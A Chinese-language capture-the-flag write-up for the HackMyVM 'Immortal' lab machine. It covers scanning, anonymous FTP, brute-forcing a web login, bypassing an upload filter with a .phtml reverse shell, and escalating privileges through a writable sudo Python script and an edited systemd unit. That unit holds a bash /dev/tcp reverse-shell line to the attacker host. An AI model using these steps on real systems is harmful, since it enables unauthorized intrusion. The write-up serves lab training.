{"pageProps":{"postData":{"id":"HackMyVMImmortal","contentHtml":"<h1>Immortal.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Immortal\">https://hackmyvm.eu/machines/machine.php?vm=Immortal</a></p>\n</blockquote>\n<p>Notes: <strong>Are you ready to become immortal?</strong></p>\n<h2>信息收集</h2>\n<pre><code class=\"hljs language-python\">nmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>               \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">29</span> 03:<span class=\"hljs-number\">21</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00033</span>s latency).\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00043</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">25</span>:<span class=\"hljs-number\">40</span>:B0 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00042</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">13</span>:BB:B5 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">nmap -sT -sV -O -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>         \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">29</span> 03:<span class=\"hljs-number\">25</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00061</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">21</span>/tcp <span class=\"hljs-built_in\">open</span>  ftp     vsftpd <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.3</span>\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">8.4</span>p1 Debian <span class=\"hljs-number\">5</span>+deb11u3 (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.56</span> ((Debian))\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">13</span>:BB:B5 (Oracle VirtualBox virtual NIC)\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">29</span> 03:<span class=\"hljs-number\">26</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00080</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp ports (reset)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">21</span>/tcp <span class=\"hljs-built_in\">open</span>  ftp\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n| http-fileupload-exploiter: \n|   \n|_    Couldn<span class=\"hljs-string\">'t find a file-type field.\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">13</span>:BB:B5 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<h2>渗透</h2>\n<p>优先级 <code>21</code> > <code>80</code> > <code>21</code></p>\n<h3>FTP</h3>\n<p>尝试使用匿名帐户登录，成功登录</p>\n<pre><code class=\"hljs language-python\">ftp <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>\nConnected to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>.\n<span class=\"hljs-number\">220</span> (vsFTPd <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.3</span>)\nName (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>:root): anonymous\n<span class=\"hljs-number\">331</span> Please specify the password.\nPassword: \n<span class=\"hljs-number\">230</span> Login successful.\nRemote system <span class=\"hljs-built_in\">type</span> <span class=\"hljs-keyword\">is</span> UNIX.\nUsing binary mode to transfer files.\n</code></pre>\n<p>存在<code>message.txt</code>拉取下来</p>\n<pre><code class=\"hljs language-python\">ftp> ls\n<span class=\"hljs-number\">229</span> Entering Extended Passive Mode (|||<span class=\"hljs-number\">36827</span>|)\n<span class=\"hljs-number\">150</span> Here comes the directory listing.\n-rw-r--r--    <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">0</span>             <span class=\"hljs-number\">504</span> Feb <span class=\"hljs-number\">27</span>  <span class=\"hljs-number\">2024</span> message.txt\n<span class=\"hljs-number\">226</span> Directory send OK.\nftp> get message.txt\nlocal: message.txt remote: message.txt\n<span class=\"hljs-number\">229</span> Entering Extended Passive Mode (|||<span class=\"hljs-number\">20892</span>|)\n<span class=\"hljs-number\">150</span> Opening BINARY mode data connection <span class=\"hljs-keyword\">for</span> message.txt (<span class=\"hljs-number\">504</span> <span class=\"hljs-built_in\">bytes</span>).\n<span class=\"hljs-number\">100</span>% |****************************************************************************************************************|   <span class=\"hljs-number\">504</span>      <span class=\"hljs-number\">861.97</span> KiB/s    <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> ETA\n<span class=\"hljs-number\">226</span> Transfer complete.\n<span class=\"hljs-number\">504</span> <span class=\"hljs-built_in\">bytes</span> received <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> (<span class=\"hljs-number\">408.79</span> KiB/s)\n\n</code></pre>\n<p>查看文件内容</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Immortal]\n└─<span class=\"hljs-comment\"># cat message.txt  </span>\nHey guys!\nI made it, after <span class=\"hljs-built_in\">all</span> this time. That<span class=\"hljs-string\">'s right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. \nNow we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. \nThey may even have already heard about our achievement, they are everywhere! That'</span>s why I have decided to strengthen the security of the server. What <span class=\"hljs-keyword\">if</span> they <span class=\"hljs-keyword\">try</span> to hack us!!! \nWishing you a long life, David.\n</code></pre>\n<pre><code class=\"hljs language-python\">嘿伙计们！\n经过这么长时间，我终于做到了。没错，伙计们，这是伟大而宝贵的不朽。人人都渴望，却无人能及。人人都喜欢，却无人拥有。\n现在我们必须小心，伙计们，我们必须向世界、政府和其他危险机构隐瞒这件事。\n他们甚至可能已经听说过我们的成就，他们无处不在！这就是为什么我决定加强服务器的安全性。如果他们试图入侵我们怎么办！！！\n祝你长命富贵，大卫。\n</code></pre>\n<p><code>FTP</code>好像就这些内容</p>\n<h3>HTTP 服务</h3>\n<p>访问网站主页，存在一个登录框</p>\n<p><img src=\"/post-images/HackMyVMImmortal/image41.png\" alt=\"image.png\"></p>\n<p>尝试扫描一下目录，啥也没扫描出来</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># gobuster dir -u http://192.168.56.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt</span>\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/.php                 (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">278</span>]\n/index.php            (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">1837</span>]\n/.php                 (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">278</span>]\n/server-status        (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">278</span>]\nProgress: <span class=\"hljs-number\">661680</span> / <span class=\"hljs-number\">661683</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>尝试爆破，<code>BURP</code>抓包，使用<code>rockyou</code>字典，爆破一段时间后可以看到一个状态码为<code>302</code>跳转的</p>\n<p><img src=\"/post-images/HackMyVMImmortal/image42.png\" alt=\"image.png\"></p>\n<p>在网页上使用<code>santiago</code>登录，成功进入</p>\n<p><img src=\"/post-images/HackMyVMImmortal/image43.png\" alt=\"image.png\"></p>\n<p>里边存在一些<code>txt</code>文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># /chat/message.txt</span>\nI am very happy that you have included me <span class=\"hljs-keyword\">in</span> the project \n<span class=\"hljs-keyword\">for</span> the quest <span class=\"hljs-keyword\">for</span> immortality. I am sure we will succeed, whatever it takes. \nBest regards, Drake\n<span class=\"hljs-comment\"># /chat/message2.txt</span>\nMessage to Eric.\nRemember to buy mice <span class=\"hljs-keyword\">for</span> the experiments, there are very few left. Also remember to tell Boyras to give us the money he owes us, <span class=\"hljs-keyword\">or</span> <span class=\"hljs-keyword\">else</span> we<span class=\"hljs-string\">'ll have to beat it out of him ourselves.\nRegards, David.\n# /chat/message3.txt\nMessage to all.\nI'</span>m glad you made it, I knew you would guess the password, it<span class=\"hljs-string\">'s the one we always used, although Boyras recommended us to stop using it because \"it was in rockyou\". \nBy the way guys, you can still upload messages to the server from this new path -> upload_an_incredible_message.php\nSaying goodbye very happy, David\n# /important/important.txt\nNothing important\n-. --- - .... .. -. --.\n.. -- .--. --- .-. - .- -. -\n# /tests/test30.txt\nTest 30 : passed\n\nI can'</span>t believe it! It<span class=\"hljs-string\">'s unbelievable! It'</span>s amazing!\n\nBut...\n\nMen die\nWoman die\nDogs die\nIs it worth living forever, <span class=\"hljs-keyword\">if</span> you will live alone?\n</code></pre>\n<p>从<code>/chat/message3.txt</code>信息的得知还存在<code>upload_an_incredible_message.php</code> 文件，是一个文件上传功能点（可能存在文件上传漏洞），而且应该是上传到<code>chat</code>目录下的</p>\n<p>在<code>/important/important.txt</code>发现一串类似摩斯密码的字符串，解码结果为 <strong>NOTHING IMPORTANT</strong></p>\n<h3>upload_an_incredible_message.php</h3>\n<p>确实是一个文件上传点，测试一下上传路径和漏洞</p>\n<p><img src=\"/post-images/HackMyVMImmortal/image44.png\" alt=\"image.png\"></p>\n<p>我们上传一个文件<code>messagebysunset.txt</code> ，上传成功，查看文件上传路径，和之前猜测的一样是在<code>chat</code> 文件夹</p>\n<p><img src=\"/post-images/HackMyVMImmortal/image45.png\" alt=\"image.png\"></p>\n<p>测试是否存在任意文件上传，经过测试，可以通过用别的<code>php</code>文件后缀绕过，这里使用<code>phtml</code> ，上传成功，并且内容可以显示出来</p>\n<p><img src=\"/post-images/HackMyVMImmortal/image46.png\" alt=\"image.png\"></p>\n<p>上传反弹<code>shell</code>代码，同时<code>kali</code>开启监听</p>\n<p><img src=\"/post-images/HackMyVMImmortal/image47.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># kali 开启监听</span>\n┌──(root㉿kali)-[~/Desktop/test/Immortal]\n└─<span class=\"hljs-comment\"># nc -lvp 1234            </span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ..\n</code></pre>\n<p>访问上传的文件后，获得<code>shell</code></p>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>            \nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>: inverse host lookup failed: Host name lookup failure\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>] <span class=\"hljs-number\">50024</span>\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (<span class=\"hljs-number\">458</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nwww-data@Immortal:/var/www/html/longlife17/chat$ \n</code></pre>\n<h3>靶机信息收集</h3>\n<p>上传<code>linpeas.sh</code>信息收集，发现许多有趣的文件</p>\n<pre><code class=\"hljs language-python\">╔══════════╣ All relevant hidden files (<span class=\"hljs-keyword\">not</span> <span class=\"hljs-keyword\">in</span> /sys/ <span class=\"hljs-keyword\">or</span> the ones listed <span class=\"hljs-keyword\">in</span> the previous check) (limit <span class=\"hljs-number\">70</span>)\n-rw-r--r-- <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">0</span> Jan <span class=\"hljs-number\">30</span> 07:<span class=\"hljs-number\">16</span> /run/network/.ifstate.lock\n-rw------- <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">0</span> Feb <span class=\"hljs-number\">27</span>  <span class=\"hljs-number\">2024</span> /etc/.pwd.lock\n-rw-r--r-- <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">220</span> Mar <span class=\"hljs-number\">27</span>  <span class=\"hljs-number\">2022</span> /etc/skel/.bash_logout\n-rw-r--r-- <span class=\"hljs-number\">1</span> drake drake <span class=\"hljs-number\">220</span> Feb <span class=\"hljs-number\">27</span>  <span class=\"hljs-number\">2024</span> /home/drake/.bash_logout\n-rw-r--r-- <span class=\"hljs-number\">1</span> eric eric <span class=\"hljs-number\">134</span> Feb <span class=\"hljs-number\">27</span>  <span class=\"hljs-number\">2024</span> /home/eric/.note.txt\n-rw-r--r-- <span class=\"hljs-number\">1</span> eric eric <span class=\"hljs-number\">220</span> Feb <span class=\"hljs-number\">27</span>  <span class=\"hljs-number\">2024</span> /home/eric/.bash_logout\n-rw-r--r-- <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">0</span> Feb <span class=\"hljs-number\">22</span>  <span class=\"hljs-number\">2021</span> /usr/share/dictionaries-common/site-elisp/.nosearch\n\n╔══════════╣ Files inside others home (limit <span class=\"hljs-number\">20</span>)\n/home/drake/.../<span class=\"hljs-keyword\">pass</span>.txt\n/home/drake/.bashrc\n/home/drake/.bash_logout\n/home/drake/.profile\n/home/drake/user.txt\n/home/eric/.note.txt\n/home/eric/.bashrc\n/home/eric/.bash_logout\n/home/eric/.profile\n/var/www/html/index.php\n/var/www/html/upload_an_incredible_message.php\n/var/www/html/longlife17/tests/test18.txt\n/var/www/html/longlife17/tests/test23.txt\n/var/www/html/longlife17/tests/test14.txt\n/var/www/html/longlife17/tests/test10.txt\n/var/www/html/longlife17/tests/test27.txt\n/var/www/html/longlife17/tests/test30.txt\n/var/www/html/longlife17/tests/test9.txt\n/var/www/html/longlife17/tests/test6.txt\n/var/www/html/longlife17/tests/test1.txt\n\n╔══════════╣ Unexpected <span class=\"hljs-keyword\">in</span> /opt (usually empty)\ndrwxr-xr-x  <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Feb <span class=\"hljs-number\">28</span>  <span class=\"hljs-number\">2024</span> .\ndrwxr-xr-x <span class=\"hljs-number\">18</span> root root <span class=\"hljs-number\">4096</span> Feb <span class=\"hljs-number\">27</span>  <span class=\"hljs-number\">2024</span> ..\n-rw-rw-rw-  <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">147</span> Feb <span class=\"hljs-number\">28</span>  <span class=\"hljs-number\">2024</span> immortal.py\n-rw-r--r--  <span class=\"hljs-number\">1</span> root root   <span class=\"hljs-number\">36</span> Feb <span class=\"hljs-number\">28</span>  <span class=\"hljs-number\">2024</span> immortal.txt\n\n╔══════════╣ Active Ports                                                                                                                                    \n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class=\"hljs-comment\">#open-ports                                                                 </span>\ntcp   LISTEN <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">128</span>          <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">22</span>         <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*                                                                                                \ntcp   LISTEN <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">5</span>            <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">14464</span>      <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*    users:((<span class=\"hljs-string\">\"python3\"</span>,pid=<span class=\"hljs-number\">1026</span>,fd=<span class=\"hljs-number\">3</span>))                                                           \ntcp   LISTEN <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">32</span>                 *:<span class=\"hljs-number\">21</span>               *:*                                                                                                \ntcp   LISTEN <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">128</span>             [::]:<span class=\"hljs-number\">22</span>            [::]:*                                                                                                \ntcp   LISTEN <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">511</span>                *:<span class=\"hljs-number\">80</span>               *:*       \n</code></pre>\n<h3>UserFlag</h3>\n<p>可以看到<code>user.txt</code>在<code>/home/drake/user.txt</code> ，尝试直接读取成功</p>\n<pre><code class=\"hljs language-python\">www-data@Immortal:/home/drake$ cat user.txt\nnothinglivesforever\n</code></pre>\n<h3>提权 - Drake</h3>\n<p>继续通过<code>Linpeas</code>给出的信息进行寻找可利用的</p>\n<ol>\n<li>\n<p><code>eric</code> 用户家目录中的<code>/home/eric/.note.txt</code></p>\n<pre><code class=\"hljs language-python\">www-data@Immortal:/home/eric$ cat .note.txt\nI think I should tell David that this immortality thing <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> a good idea, although I<span class=\"hljs-string\">'m sad to tell him, he'</span>s so excited about it\n<span class=\"hljs-comment\">## 我想我应该告诉大卫，永生不是什么好主意，尽管我很伤心地告诉他，他对此很兴奋</span>\n</code></pre>\n</li>\n<li>\n<p><code>/opt</code>下的<code>immortal.txt</code> 和 <code>immortal.py</code></p>\n<pre><code class=\"hljs language-python\">www-data@Immortal:/opt$ cat immortal.txt\nEvery man dies. Not every man lives\n<span class=\"hljs-comment\">## 每个人都会死，但不是每个人都能活</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">www-data@Immortal:/opt$ cat immortal.py\na = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-built_in\">str</span>(<span class=\"hljs-string\">\"Do you want to be immortal: \"</span>))\n\n<span class=\"hljs-keyword\">if</span> a.lower() == <span class=\"hljs-string\">\"yes\"</span> <span class=\"hljs-keyword\">or</span> a.lower() == <span class=\"hljs-string\">\"no\"</span>:\n   <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Bad answer\"</span>)\n<span class=\"hljs-keyword\">else</span>:\n   <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Are you sure?\"</span>)\n</code></pre>\n<p>好像并没有用，不过发现对<code>immortal.py</code>我们拥有修改权限</p>\n<pre><code class=\"hljs language-python\">www-data@Immortal:/opt$ ls -al\ndrwxr-xr-x  <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Feb <span class=\"hljs-number\">28</span>  <span class=\"hljs-number\">2024</span> .\ndrwxr-xr-x <span class=\"hljs-number\">18</span> root root <span class=\"hljs-number\">4096</span> Feb <span class=\"hljs-number\">27</span>  <span class=\"hljs-number\">2024</span> ..\n-rw-rw-rw-  <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">147</span> Feb <span class=\"hljs-number\">28</span>  <span class=\"hljs-number\">2024</span> immortal.py\n-rw-r--r--  <span class=\"hljs-number\">1</span> root root   <span class=\"hljs-number\">36</span> Feb <span class=\"hljs-number\">28</span>  <span class=\"hljs-number\">2024</span> immortal.txt\n</code></pre>\n</li>\n<li>\n<p><strong>/home/drake/.../pass.txt</strong></p>\n<p>看着像是密码</p>\n<pre><code class=\"hljs language-python\">www-data@Immortal:/opt$ cat /home/drake/.../<span class=\"hljs-keyword\">pass</span>.txt\nnetflix : drake123\namazon : 123drake\nshelldred : shell123dred (f4ns0nly)\nsystem : kevcjnsgii\nbank : myfavouritebank\nnintendo : <span class=\"hljs-number\">123456</span>\n</code></pre>\n<p>尝试使用<code>SSH</code>登录，使用<code>system</code>的密码，登陆成功</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Immortal]\n└─<span class=\"hljs-comment\"># ssh drake@192.168.56.15</span>\ndrake@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span><span class=\"hljs-string\">'s password: \nLinux Immortal 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Feb 29 18:55:43 2024 from 10.0.2.15\ndrake@Immortal:~$ \n</span></code></pre>\n</li>\n</ol>\n<h3>提权 - Eric</h3>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">drake@Immortal:/opt$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> drake on Immortal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser drake may run the following commands on Immortal:\n    (eric) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/python3 /opt/immortal.py\n</code></pre>\n<p>我们将<code>python</code>文件修改，将提权语句写进去</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> os; os.system(<span class=\"hljs-string\">\"/bin/bash -i\"</span>)\na = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-built_in\">str</span>(<span class=\"hljs-string\">\"Do you want to be immortal: \"</span>))\n\n<span class=\"hljs-keyword\">if</span> a.lower() == <span class=\"hljs-string\">\"yes\"</span> <span class=\"hljs-keyword\">or</span> a.lower() == <span class=\"hljs-string\">\"no\"</span>:\n   <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Bad answer\"</span>)\n<span class=\"hljs-keyword\">else</span>:\n   <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Are you sure?\"</span>)\n</code></pre>\n<p>然后运行文件，获得<code>eric</code>用户</p>\n<pre><code class=\"hljs language-python\">drake@Immortal:/opt$ sudo -u eric /usr/<span class=\"hljs-built_in\">bin</span>/python3 /opt/immortal.py\n</code></pre>\n<h3>提权 - Root</h3>\n<p>再次查看权限，可以已<code>root</code>权限运行<code>Immortal</code> 服务</p>\n<pre><code class=\"hljs language-python\">eric@Immortal:/opt$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> eric on Immortal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser eric may run the following commands on Immortal:\n    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service\n    (root) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/systemctl start immortal.service\n    (root) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/systemctl stop immortal.service\n    (root) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/systemctl enable immortal.service\n    (root) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/systemctl disable immortal.service\n    (root) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/systemctl daemon-reload\n</code></pre>\n<p>看到存在<code>sudoedit /etc/systemd/system/immortal.service</code> ，那么就可以用来提权乐</p>\n<p>修改<code>immortal.service</code>文件，添加反弹<code>shell</code>代码，然后<code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">eric@Immortal:/usr/<span class=\"hljs-built_in\">bin</span>$ sudoedit /etc/systemd/system/immortal.service\n//\n[Unit] \nDescription=Immortal Service\nAfter=network.target\n\n[Service]\n<span class=\"hljs-type\">Type</span>=oneshot\nExecStart=/<span class=\"hljs-built_in\">bin</span>/bash -c <span class=\"hljs-string\">'echo \"Every man dies. Not every man lives\" > /opt/immortal.txt'</span>\nExecStart=/<span class=\"hljs-built_in\">bin</span>/bash -c <span class=\"hljs-string\">'/bin/bash -i >&#x26; /dev/tcp/192.168.56.4/4444 0>&#x26;1'</span>\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>\n<p>然后执行<code>/usr/bin/systemctl start immortal.service</code></p>\n<pre><code class=\"hljs language-python\">eric@Immortal:/usr/<span class=\"hljs-built_in\">bin</span>$ sudo /usr/<span class=\"hljs-built_in\">bin</span>/systemctl start immortal.service\n</code></pre>\n<p>然后<code>Kali</code>就可以获取到<code>root</code>的反弹过来的<code>shell</code></p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Immortal]\n└─<span class=\"hljs-comment\"># nc -lvp 4444</span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">4444</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>: inverse host lookup failed: Host name lookup failure\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.15</span>] <span class=\"hljs-number\">60160</span>\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (<span class=\"hljs-number\">14559</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nroot@Immortal:/<span class=\"hljs-comment\"># cat /root/root.txt</span>\nfiNally1mMort4l\n</code></pre>","title":"HackMyVM - Immortal","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Immortal. 